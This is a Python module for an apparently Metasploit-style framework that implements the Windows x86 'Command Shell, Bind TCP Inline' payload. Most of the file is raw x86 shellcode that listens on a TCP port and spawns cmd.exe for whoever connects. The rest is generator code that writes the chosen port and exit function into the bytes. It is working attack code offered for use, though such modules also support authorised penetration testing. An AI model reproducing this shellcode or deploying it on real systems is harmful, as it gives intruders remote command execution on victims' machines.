import struct
from collections.abc import Mapping, Sequence

from libs.arch import ARCH_X86
from libs.platform import PLATFORM_WINDOWS
from libs.text import Text
from terasploit.module.payload import (
    SINGLE,
    Payload,
    PayloadHandler,
)


class TerasploitModule(Payload):
    """Windows x86 Command Shell, Bind TCP Inline."""

    NAME: str = "Windows x86 Command Shell, Bind TCP Inline."
    DESCRIPTION: str = "Listen for a connection and spawn a command shell (Windows x86)"
    AUTHOR: Sequence = ["vlad902", "sf", "4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.1"
    RANK: str = "normal"
    REFERENCES: Sequence = [
        "modules/payloads/singles/windows/shell_bind_tcp.rb",
    ]
    PAYLOAD_TYPE: str = SINGLE
    HANDLER: object = PayloadHandler.BindTCP
    CACHED_SIZE: int = 328
    MAX_SIZE: int | None = 512
    ARCH: Sequence = [ARCH_X86]
    PLATFORM: Sequence = [PLATFORM_WINDOWS]
    # This bytearray is replaceable without changing anything in the methods below
    # Just make sure to add the correct offsets.
    PAYLOAD: Mapping = {
        "Offsets": {"LPORT": [192, "!H"], "EXITFUNC": [298, "<I"]},
        "Payload": bytearray(
            b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x86\x8b\x50\x30\x8b"
            b"\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c"
            b"\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
            b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20"
            b"\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac"
            b"\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
            b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
            b"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
            b"\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
            b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00"
            b"\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2"
            b"\xfd\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00"
            b"\x11\x5c\x89\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57"
            b"\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57"
            b"\x97\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x86\x00\x89\xe3\x57"
            b"\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
            b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e"
            b"\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46"
            b"\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6"
            b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
            b"\x13\x72\x6f\x6a\x00\x53\xff\xd5"
        ),
    }
    OPTIONS: Sequence[str] = ["RHOST", "LPORT", "EXITFUNC"]

    def write_field(self, payload, offset, data, expected_size):
        """Write fixed-width encoded data into a bytearray."""
        if not isinstance(payload, bytearray):
            raise TypeError("payload must be a bytearray")
        if len(data) != expected_size:
            raise ValueError(f"Expected {expected_size} bytes, received {len(data)}")
        if offset < 0 or offset + expected_size > len(payload):
            raise ValueError("Field offset is outside the payload")

        payload[offset : offset + expected_size] = data
        return payload

    def pack_payload_contents(self, lport, exitfunc):
        """Pack payload contents."""
        encoded_lport = struct.pack(self.PAYLOAD["Offsets"]["LPORT"][1], int(lport))
        exitfunc = struct.pack(self.PAYLOAD["Offsets"]["EXITFUNC"][1], Text.ror13_hash(exitfunc))

        return encoded_lport, exitfunc

    def generate(self, ctx) -> bytes | str:
        """Generate single windows x86 payload."""
        lport, exitfunc = self.pack_payload_contents(
            ctx.get_option("LPORT"),
            ctx.get_option("EXITFUNC"),
        )
        payload = self.PAYLOAD["Payload"]
        self.write_field(
            payload,
            self.PAYLOAD["Offsets"]["LPORT"][0],
            lport,
            len(lport),
        )
        self.write_field(
            payload,
            self.PAYLOAD["Offsets"]["EXITFUNC"][0],
            exitfunc,
            len(exitfunc),
        )

        return bytes(payload)
